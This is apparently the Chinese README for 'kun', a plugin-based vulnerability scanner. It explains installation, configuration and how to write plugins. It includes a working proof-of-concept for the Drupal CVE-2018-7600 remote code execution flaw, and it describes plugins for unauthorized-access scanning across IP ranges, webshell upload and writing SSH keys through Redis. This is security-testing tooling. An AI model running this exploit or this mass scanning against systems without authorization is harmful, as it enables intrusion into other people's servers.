# kun scanner
插件化漏洞扫描器

## 简介：
插件化漏洞扫描器，对大量目标（单个目标，IP段，文件、API、爬虫）和大量POC组合快速批量漏洞测试，支持web、终端两种操作方式。

## 适合做什么
因为扫描器是对目标和插件组合使用多线程进行测试，所以速度提升是提升在对组合后多线程取队列测试，但单个Poc运行都是单线程的。如：

1. 针对10.10.10.1-10.10.20.254进行未授权访问测试（各种未授权访问的脚本），组合所有目标插件放入队列后，多线程取队列测试，速度会很快，因为每个插件的测试时间都很短。

2. 针对http://10.10.10.1/ 进行目录爆破，这种速度会非常慢，因为组合后的结果只有一条，但是插件的内容是跑字典，相当于单线程爆破，这样速度就很慢了。

## 特点：
1. 操作方式方面，提供了web和终端两种操作方式。通过终端和web创建扫描都是可以的。终端开了数据库存储后创建扫描，web也是可以看到扫描结果的。
2. 目标获取方面，提供了多重目标输入方式，单个目标，IP段，文件、API（目前就只写了zoomeye、百度域名采集）、爬虫（目前完成了域名采集爬虫）。
3. 域名采集爬虫方面，不是使用的搜索引擎爬虫，主要是根据页面嵌入的新域名然后对下一个域名进行继续扫描新域名，后边会加入搜索引擎的爬虫。
4. 在爬虫方面，因为爬虫的速度是不确定的，可能获取目标的时间就会特别的长（假设要获取6万个目标，那爬虫获取目标的时间可能就会非常的长），所以扫描器采用边爬边扫的方式，为爬虫单独开一个进程，爬虫进程中使用多线程加快爬虫速度，扫描进程获取到爬虫进程中的目标数据后就会开始扫描，提升爬虫扫描下的扫描速度。
5. 插件方面，可以选择一个或者全选，也可以选择特定文件夹下所有的，选择unauth文件夹下的，那指定unauth*就可以了。对于无回显的插件使用的是ceye 。
6. web方面，提供扫描任务、漏洞等信息的查看。

## 依赖：

* Python 2.7
* Flask
* Celery
* MongoDB
* Redis

## 平台：

* Linux
* Mac OS X
* Windows下不建议使用，因为爬虫部分用了多进程，Windows下多进程不太一样，所以Windows下爬虫功能目前是不能用的，在终端下其他功能是可用的，但不确定是否存在编码问题，没有进行测试。Web端可以运行，因为程序使用Celery 3.1版本是支持Windows的，但没有进行测试。
* 建议在Linux或者Mac OS X使用

## 安装：
### 在ubuntu 16.04上安装
#### 1. 完整安装，包括web部分：
##### 配置环境：
```
git clone https://github.com/SPuerBRead/kun.git
cd ./kun
pip install -r requirements_all.txt
apt install mongodb
apt install redis-server
```

##### 补充配置信息：

配置文件分为两种，web的配置文件和扫描器的配置文件

web配置文件
```
kun/config.py
```

web端连接mongo和redis的地址端口在这个配置文件下，默认是127.0.0.1:27017，127.0.0.1:6379

扫描器的配置文件
```
kun/kunscanner/lib/config/scanner.conf
```
需要对zoomeye和ceye进行配置填写token信息，其他的可以不变，每一项具体内容有详细注释。

##### 启动程序：

gunicorn和supervisor装不装都是可以的

* 使用gunicorn和supervisor

需要对supervisord.conf中的directory、stdout_logfile、stderr_logfile值根据实际情况修改

启动web服务
```
gunicorn -c gunicorn.conf web:app
```
启动celery
```
supervisord -c /supervisord.conf
```
访问 http://127.0.0.1:5000/ 首次自动跳转至创建用户界面，创建用户登录成功后，点击右上角账户名处，下拉框中点击更新插件后，即可使用开始。
* 不使用gunicorn和supervisor

启动web服务
```
python web.py
```
启动celery
```
PYTHONOPTIMIZE=1&&celery worker -A app.celery_worker.celery -l INFO
```
访问 http://127.0.0.1:5000/ 操作同上。

完整安装后，也可以不使用web端直接在终端下运行扫描器
```
python kun.py -u 127.0.0.1 --script "unauth*"
```

#### 2. 只在终端下运行扫描器，不安装web端：
##### 配置环境：
```
git clone https://github.com/SPuerBRead/kun.git
cd ./kun
pip install -r requirements_cli.txt
```
##### 补充配置信息：
只需要修改扫描器的配置文件，添加zoomeye和ceye信息
在不启用数据库存储的情况下是不需要安装mongo的，程序默认是开了数据库存储的，所以将/kunscanner/lib/config/scanner.conf 中的SAVE_RESULT_TO_DATABASE = true改为false就可以终端下直接运行扫描器了
##### 启动程序：
```
python kun.py -u 127.0.0.1 --script "unauth*"
```
终端下需要数据保存到数据库的话，SAVE_RESULT_TO_DATABASE设置为true，然后安装mongodb并配置扫描器的配置文件（默认是127.0.0.1:27017），数据就会存储到mongo中。若要查看数据需要安装web也是一样的，再像上边的一样部署下web就可以用web操作扫描器了。

## 注意：
Redis和MongoDB程序里都是没有设置连接密码的，需要保持只能本机访问的状态，不然本身就是未授权访问了。

## 截图：
### 创建扫描任务
![image](https://user-images.githubusercontent.com/18071202/40243250-5130115e-5af2-11e8-8be7-f65567af208f.png)
### 任务列表
![image](https://user-images.githubusercontent.com/18071202/40243479-e75c88e2-5af2-11e8-9d1e-6a0586184217.png)
### 任务详细信息
![image](https://user-images.githubusercontent.com/18071202/40243553-1d88a6a8-5af3-11e8-8be1-e7db61f4fb70.png)
### URL扫描
![image](https://user-images.githubusercontent.com/18071202/40243760-a9b5c886-5af3-11e8-880a-21f9baab0b97.png)
### 利用API扫描
![image](https://user-images.githubusercontent.com/18071202/40244757-4fee539c-5af6-11e8-9150-cea5070a5202.png)
### 利用爬虫扫描
![image](https://user-images.githubusercontent.com/18071202/40275588-66f9cb1c-5c26-11e8-8b24-254e730d6290.png)
### 百度获取目标扫描
![image](https://user-images.githubusercontent.com/18071202/40577565-58119922-613a-11e8-8e9e-c6e5c2dba438.png)
### 插件信息
![image](https://user-images.githubusercontent.com/18071202/40246377-21e75598-5afb-11e8-9a87-8b58511fe7ed.png)
## 程序流程
![image](https://user-images.githubusercontent.com/18071202/40247370-bd036eec-5afe-11e8-969c-cc960a2cb2f5.png)

## 插件：
插件目录 kun/kunscanner/lib/scripts

每个插件包含两个主要函数Info函数、Poc函数。

### Info函数提供插件的基础信息
如下是Drupal命令执行的例子
```
def Info():
    poc_info = OrderedDict()
    poc_info['name'] = "drupal_exec_7600"
    poc_info['info'] = "drupal core remote code execution (CVE-2018-7600)"
    poc_info['title'] = u'Drupal远程命令执行'
    poc_info['author'] = "a2u"
    poc_info['time'] = "2018.04.14"
    poc_info['type'] = 'attack'
    poc_info['level'] = SCRIPT_LEVEL.HIGH
    return poc_info
```
1. name->文件名
2. info->简介
3. title->web下的插件标题
4. author->作者
5. time->时间
6. type->插件类别
7. level->插件等级

#### 插件类别
插件类别包含两种attack和info，两种插件都返回一个字典作为结果，区别在于两种插件返回字典的内容是不同的

1. attack类型，验证型的漏洞脚本，插件利用结果成功或者失败，所以返回的字典包含两个键，其中success表示是否存在该漏洞
另外一个键是message,表示插件返回的其他信息，例如phpcms_v9的文件上传漏洞，shell地址会作为message返回给扫描器，若存在该漏洞Poc函数的返回结果即为：
```
result['success'] = True
result['message'] = shell_path
```
2. info类型插件，主要作用是返回信息，不是验证是否成功，返回的结果中，每种信息的名字作为key,具体内容作为value,例如通过一个脚本批量获取域名的whois信息和ip地址，那么Poc函数返回的结果为：
```
result['whois'] = whois_data
result['ip']  = ip_address
```
扫描器会根据不同的插件类型对返回信息进行处理，显示信息，存储数据库等。

#### 插件等级
插件等级可以从枚举类SCRIPT_LEVEL中获得，如漏洞为高危
```
from kunscanner.lib.core.enums import SCRIPT_LEVEL
poc_info['level'] = SCRIPT_LEVEL.HIGH
```
### Poc函数包含具体利用代码
如下是Drupal命令执行的例子
```
def Poc(url):
    init_url = url
    socket.setdefaulttimeout(5)
    result = {}
    result['success'] = False
    result['message'] = ''
    try:
        random_str = RandomString()
        url = GetNetloc(url, True)
        target = url + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
        payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
                   'mail[#type]': 'markup', 'mail[#markup]': 'echo '+random_str+' | tee '+random_str+'.txt'}
        r = requests.post(target, data=payload, timeout = 5)
        if r.status_code != 200:
            return result
        else:
            r = requests.get(url+'/'+random_str+'.txt', timeout = 5)
            if r.status_code == 200 and random_str in r.text and 'html' not in r.text:
                result['success'] = True
                result['message'] = 'random_file: /'+random_str+'.txt'
            return result
    except Exception,e:
        raise PocWarningException(init_url, Info()['name'], repr(e))
```
首先init_url只是保存一份最初始的目标，用于Poc出现异常时的显示,然后创建result字典作为返回结果。

下边的利用代码使用try except包含，因为设计的是一个多目标对应多漏洞的扫描器，所以程序是不能因为Poc出现一个异常就停止整个程序的运行的，扫描器提供了两种可以抛出异常分别是PocWarningException和PocErrorException 

* 导入异常函数
```
from kunscanner.lib.core.exception import PocWarningException PocErrorException
```

1. PocWarningException主要是处理不需要停止程序的异常，如requests请求超时，扫描器捕获到这个异常后会将异常内容存入log或输出到终端（根据扫描器配置文件中的配置选择）后忽略并继续运行其他测试代码。
2. PocErrorException主要处理已知的异常，如redis写入ssh公钥，但是在Poc中公钥变量为空，验证是否成功使用的私钥也为空，抛出这个异常，程序会停止运行， 并进行提示，但是这样也导致了一个问题，在--script-all的情况下，其中一个插件产生这个异常，就会直接退出程序。

Poc函数的返回，在上边插件类别部分已经说明。

* 导入工具函数
```
from kunscanner.lib.utils.utils import GetNetloc, RandomString
```
* 通过ceye获取结果,CeyeApi返回为True或者False
```
from kunscanner.lib.utils.ceye import CeyeApi
result = CeyeApi(rangom_string)
```
编写新插件完成后，放在插件目录下（kun/kunscanner/lib/scripts）终端下即可使用，web端请点击更新插件进行更新，同样删除插件后也需要点击更新插件来更新数据库中的插件信息。

### 插件注意事项
插件请求的时间需要插件自己控制，requests或者socket的超时时间等，requests有时会出现加了timeout仍然卡死的现象，可以在函数中设置socket.setdefaulttimeout()

## 更新

* 2018.5.26 增加百度域名采集

## 感谢

* 前端的作者[@huyuangang](https://github.com/huyuangang)

* 程序整体结构上学习了POC-T，很多地方参考了[POC-T](https://github.com/Xyntax/POC-T)，以前一直用POC-T，当前的一些插件也是用POC-T的插件修改的，感谢@Xyntax大佬

## 最后

插件的数量目前比较少，只弄了几个比较常用的和比较新的，插件的准确性太重要了，许多流出来的老插件就没有改了，后边会慢慢提交，工作得做，Poc就还是会有==

代码能力有限，bug肯定会有的==，结构和编码也都不是那么规范，后期逐渐修改。
